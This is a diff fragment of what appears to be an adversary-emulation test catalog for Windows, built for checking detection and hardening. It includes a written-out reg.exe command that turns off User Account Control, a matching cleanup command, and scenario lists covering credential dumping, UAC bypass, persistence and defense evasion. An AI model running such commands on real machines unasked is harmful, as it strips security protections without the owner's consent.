+      "guid": "9e8af564-53ec-407e-aaa8-3cb20c3af7f9",
+      "technique_id": "T1548.002",
+      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
+      "name": "Disable UAC using reg.exe",
+      "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0",
+      "executor": "command_prompt",
+      "elevation_required": true,
+      "command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\n",
+      "cleanup": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f\n",
+      "risk_tier": "intrusive",
+      "origin": "catalog",
+      "source_path": "atomics/T1548.002/T1548.002.yaml",
+      "curation_note": "Sets EnableLUA=0 (UAC off after reboot); cleanup restores it."
+    }
+  ],
+  "scenarios": [
+    {
+      "id": "credential-access",
+      "name": "Credential access",
+      "description": "Tries the common ways an attacker with admin rights pulls credentials off a Windows machine: LSASS memory dumps, registry hive copies, and enabling plaintext credential caching. Exercises LSA protection, Credential Guard, and Defender.",
+      "test_guids": [
+        "2536dee2-12fb-459a-8c37-971844fa73be",
+        "47a539d1-61b9-4364-bf49-a68bc2a95ef0",
+        "5c2571d0-1572-416d-9676-812e64ca9f44",
+        "21df41be-cdd8-4695-a650-c3981113aa3c",
+        "c0413fb5-33e2-40b7-9b6f-60b29f4a7a18"
+      ]
+    },
+    {
+      "id": "uac-bypass",
+      "name": "UAC bypass",
+      "description": "Registry-hijack UAC bypasses (fodhelper, Event Viewer) and switching UAC off. Exercises UAC configuration and detection of auto-elevation abuse.",
+      "test_guids": [
+        "58f641ea-12e3-499a-b684-44dee46bd182",
+        "5073adf8-9a50-4bd9-b298-a9bd2ead8af9",
+        "9e8af564-53ec-407e-aaa8-3cb20c3af7f9"
+      ]
+    },
+    {
+      "id": "persistence",
+      "name": "Persistence",
+      "description": "Run keys, scheduled tasks, new local (admin) accounts, and service hijacking — the ways malware survives a reboot.",
+      "test_guids": [
+        "e55be3fd-3521-4610-9d1a-e210e42dcf05",
+        "554cbd88-cde1-4b56-8168-0be552eed9eb",
+        "42f53695-ad4a-4546-abb6-7d837f644a71",
+        "af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd",
+        "6657864e-0323-4206-9344-ac9cd7265a4f",
+        "fda74566-a604-4581-a4cc-fbbe21d66559",
+        "1f896ce4-8070-4959-8a25-2658856a70c9"
+      ]
+    },
+    {
+      "id": "defense-evasion",
+      "name": "Execution and defense evasion",
+      "description": "Encoded/fileless PowerShell, offensive cmdlet names, turning off PowerShell logging and RDP NLA, and rundll32 script proxy execution. Exercises AMSI, logging, and detection coverage.",
+      "test_guids": [
+        "fa050f5e-bc75-4230-af73-b6fd7852cd73",
+        "49eb9404-5e0f-4031-a179-b40f7be385e3",
+        "95b25212-91a7-42ff-9613-124aca6845a8",
+        "01d1c6c0-faf0-408e-b368-752a02285cb2",
+        "638730e7-7aed-43dc-bf8c-8117f805f5bb"
+      ]
+    },
+    {
+      "id": "discovery",
+      "name": "Local discovery",
+      "description": "The reconnaissance an intruder runs first: accounts, groups, system and network configuration, firewall rules, processes. All benign; mostly a test of whether it is logged.",
+      "test_guids": [
+        "80887bec-5a9b-4efc-a81d-f83eb2eb32ab",
+        "1f454dd6-e134-44df-bebb-67de70fb6cd8",
+        "66703791-c902-4560-8770-42b8a91f7667",
+        "970ab6a1-0157-4f3f-9a73-ec4166754b23",
+        "038263cb-00f4-4b0a-98ae-0696c67e1752",
+        "c5806a4f-62b8-4900-980b-c7ec004e9908"
+      ]
+    }
+  ]
+}
